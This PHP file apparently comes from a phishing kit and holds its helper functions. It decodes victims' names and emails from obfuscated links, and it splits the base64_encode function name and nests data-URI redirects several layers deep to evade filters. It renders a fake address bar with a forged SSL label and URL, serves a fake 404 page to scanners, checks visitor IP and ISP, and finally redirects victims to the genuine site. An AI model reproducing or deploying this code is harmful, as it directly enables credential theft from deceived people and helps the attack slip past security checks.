<?php
function writeinfo($file, $info, $m){
$fp=fopen($file, $m);
fwrite($fp, $info);
fclose($fp);
}
function get_data($url) {
	$ch = curl_init();
	$timeout = 5;
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	$data = curl_exec($ch);
	curl_close($ch);
	return $data;
}
function asciiToInt($char){
$success = "";
    if(strlen($char) == 1)
        $success = ord($char);
    else{
        for($i = 0; $i < strlen($char); $i++){
                $success .= str_pad((string)ord($char[$i]), 3, "0", STR_PAD_LEFT);
        	}
    	}
return $success;
}

function getIp(){
	$client  = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote  = $_SERVER['REMOTE_ADDR'];

	if(filter_var($client, FILTER_VALIDATE_IP))
	{
	    $ip = $client;
	}
	elseif(filter_var($forward, FILTER_VALIDATE_IP))
	{
	    $ip = $forward;
	}
	else
	{
	    $ip = $remote;
	}
	return $ip;
}

function getIsp(){
	return gethostbyaddr(getIp());
}
function getUA()
{
	return $_SERVER['HTTP_USER_AGENT'];
}
function isMobile(){
	$ua = getUA();
	switch (true) {
		case stripos($ua, 'android')!==false:
		case stripos($ua, 'iphone')!==false:
		case stripos($ua, 'blackberry')!==false:
		case stripos($ua, 'Windows Phone')!==false:
		case stripos($ua, 'Phone ')!==false:
		case strpos($ua, 'MIDP')!==false:
		case stripos($ua, 'Mobile')!==false:
			return true;
		break;
	}
	//we still here? then it's not a phone
	return false;
}
function generateRandomString($length = 10) {
    $characters = '0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function generateRandomAlphaNumericString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


function randomId($object,$length=13,$num=1){
	$nustring = generateRandomString($length);
	$existingids = array_keys((array)$object);
	if ($num==1) {
	if (in_array($nustring, $existingids)) {
		return randomSpamId($object,$length);
	}
	return $nustring;
	}
}

function randomSpamId($object,$length=8,$num=1){
	$nustring = generateRandomAlphaNumericString($length);
	$existingids = array_keys((array)$object);
	if ($num==1) {
	if (in_array($nustring, $existingids)) {
		return randomSpamId($object,$length);
	}
	return $nustring;
	}
}

function timestamp($object,$prefix="message"){
	$object = (array) $object;
	$object[$prefix.'_minute'] = date('i');
	$object[$prefix.'_hour'] = date('h');
	$object[$prefix.'_period'] = date('A');
	$object[$prefix.'_day'] = date('d');
	$object[$prefix.'_month'] = digitMonth(date('F'));
	$object[$prefix.'_year'] = date('Y');
	return (object) $object;
}

function loadJson($dbfile='db/ad.json'){
	if(!file_exists($dbfile))return array();
	$raw = file_get_contents($dbfile);
	$obj = json_decode($raw);
	return $obj;
}

function saveJson($object,$dbfile){
	$objString = json_encode($object);
	if (!$objString) {
		echo "object to save cannot be empty!";exit;
	}
	writeinfo($dbfile,$objString,"w");
}

function intToAscii($ints){
	$arrayOfChars = str_split($ints,3);
	$wholeString = '';
	foreach ($arrayOfChars as $charCode) {
		$wholeString .= chr($charCode);
	}
	return $wholeString;
}

function encode($data){
return compressStr(asciiToInt($data));
}

//try to compress string
function compressStr($string){
$replace = array('a'=>'11111','b'=>'1111','c'=>'111','d'=>'11',
                 'e'=>'01','f'=>'02','g'=>'03','h'=>'04','i'=>'05',
                  'j'=>'06','k'=>'07','l'=>'08','m'=>'09','n'=>'21',
                  'o'=>'31','p'=>'41','q'=>'51','r'=>'61','s'=>'71',
                  't'=>'81','u'=>'91','v'=>'24'
                );
//simple search and replace :-)
$string = str_replace(array_values($replace), array_keys($replace), $string);
//compress some more
$rkeys = range('A','Z');
$rvalues = '1'.implode('1',range('a','z'));
$rvalues = str_split($rvalues,2);
return str_replace($rvalues, $rkeys, $string);
}

function decompressStr($string){
  $replace = array('a'=>'11111','b'=>'1111','c'=>'111','d'=>'11',
                 'e'=>'01','f'=>'02','g'=>'03','h'=>'04','i'=>'05',
                  'j'=>'06','k'=>'07','l'=>'08','m'=>'09','n'=>'21',
                  'o'=>'31','p'=>'41','q'=>'51','r'=>'61','s'=>'71',
                  't'=>'81','u'=>'91','v'=>'24'
                );
  //decompress first level
$rkeys = range('A','Z');
$rvalues = '1'.implode('1',range('a','z'));
$rvalues = str_split($rvalues,2);
$string = str_replace($rkeys, $rvalues, $string);
//simple search and replace :-)
return str_replace(array_keys($replace), array_values($replace), $string);
}

function decodeUriData($data){
  list($a['email'],$a['first_name'],$a['initial'],$a['last_name']) = explode('|',intToAscii(decompressStr($data)));
  return $a;
}

function treatVariables($code){
	global $config,$isegments ;
	//you can change the variables below to reflect your own values
	$replace = array('{imageDirectory}'=>$config->imageDirectory);
	//check there is post data
	if (isset($_POST['email'])) {
		$replace['{email}'] = $_POST['email'];
		$replace['{first_name}'] = $_POST['first_name'];
		$replace['{initial}'] = $_POST['initial'];
		$replace['{last_name}'] = $_POST['last_name'];
		
	}
		$replace['{pageTitle}'] = $config->pageTitle;
		$replace['{faviconURI}'] = $config->faviconURI;
	//lets determine base path
	//print_r($isegments);exit;
	$actionLink = $isegments[1].$config->submitFile;
	$action = 'javascript:'.str_replace('{actionLink}', $actionLink, $config->submitJavascript);
	$replace['{action}'] = $action;
	$replace['{weekday}'] = date('l');
	$replace['{month}'] = date('F');
	$replace['{date}'] = date('d');
	$replace['{year}'] = date('Y');
	$yesterday = date('d')-1;
	$replace['{slashdate}'] = date('m/').$yesterday.date('/y');
	$code = str_replace(array_keys($replace), array_values($replace), $code);
	return $code;
}

function checkSumAlg($dataArr){
$checksum = $dataArr['checksum'];
unset($dataArr['checksum']);
$dataArrString = implode('', array_values($dataArr));
$stringInt = asciiToInt($dataArrString);
$stringCheckSum = array_sum(str_split($stringInt));
return $checksum==$stringCheckSum;
}

function function404($num){
  global $npage;
  //echo $num;
  header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found");
	echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /$npage was not found on this server.</p>
<hr>
<address>".$_SERVER['SERVER_SIGNATURE']."</address>
</body></html>
";
	exit();
}

//function for creating data uri on the fly
function getStringDataURI($string, $mime = 'text/html') {
	$b6enc = 'ba'.'s'.'e'.'6'.'4'.'_en'.'co'.'de';
	return 'data:'.$mime.';bas'.'e6'.'4,'.$b6enc(treatVariables($string));
}

function wrapRedirect($string,$shouldAlert='no'){
	global $config;
	if ($config->redirect_method=='meta') {
		$fstring = "<META http-equiv=\"refresh\" content=\"0;URL=$string\">";
		if (strlen($config->redirect_error) > 0 && $shouldAlert=='yes') {
		$fstring = "<script>alert('".$config->redirect_error."');</script><META http-equiv=\"refresh\" content=\"0;URL=$string\">";
		}
	}else{
			$fstring = "<script>window.location='$string';</script>";
		if (strlen($config->redirect_error) > 0 && $shouldAlert=='yes') {
		$fstring = "<script>alert('".$config->redirect_error."');window.location='$string';</script>";
		}	
	}
	return $fstring;
}

function scriptWrapString($string){
	$string = getStringDataURI($string);
	$string = wrapRedirect($string);
	return $string;

}

function scriptEncString($string){
	global $config;
	$stage = 6;
	switch ($config->encode_depth) {
		case 6:
			//$shouldAlert = ($stage==6)?'yes':'no';
			$string = scriptWrapString($string);
		case 5:
			//$shouldAlert = ($stage==6)?'yes':'no';
			$string = scriptWrapString($string);
		case 4:
			//$shouldAlert = ($stage==6)?'yes':'no';
			$string = scriptWrapString($string);		
		case 3:
			//$shouldAlert = ($stage==6)?'yes':'no';
			$string = scriptWrapString($string);
		case 2:
			//$shouldAlert = ($stage==6)?'yes':'no';
			$string = scriptWrapString($string);
		case 1:
			//$shouldAlert = ($stage==6)?'yes':'no';
			$string = scriptWrapString($string);
			break;
	}
	return $string;
}

function scriptEncFile($file){
	global $config;
	$string = ($config->reverseHtmlCode)?strrev(file_get_contents($file)):file_get_contents($file);
	return scriptEncString($string);
}

function scriptEncFileWithAddressBar($file){
	global $config, $addressBar ;
	$htmlCode = ($config->reverseHtmlCode)?strrev(file_get_contents($file)):file_get_contents($file);
	$wrapCode = ($config->reverseHtmlCode)?strrev(file_get_contents($addressBar)):file_get_contents($addressBar);
	//get b64 encoding
	$htmlCode = getStringDataURI($htmlCode);
	$search = array('{sslText}','{fkUrlPart1}','{fkUrlPart2}','{fkUrlPart3}','{srcCode}');
	$replace = array($config->sslText, $config->fkUrlPart1, $config->fkUrlPart2, $config->fkUrlPart3, $htmlCode);
	//let's roll
	$fullCode = str_replace($search, $replace, $wrapCode);
	return scriptEncString($fullCode);
}

function redirectToActualSite(){
	global $config ;
	echo scriptEncString(wrapRedirect($config->redirectUrl,$config->should_alert));
	exit();
}

function validateIpIsp(){
	global $session ;
	return $session->get('ip')==getIp() && $session->get('isp')==getIsp();
}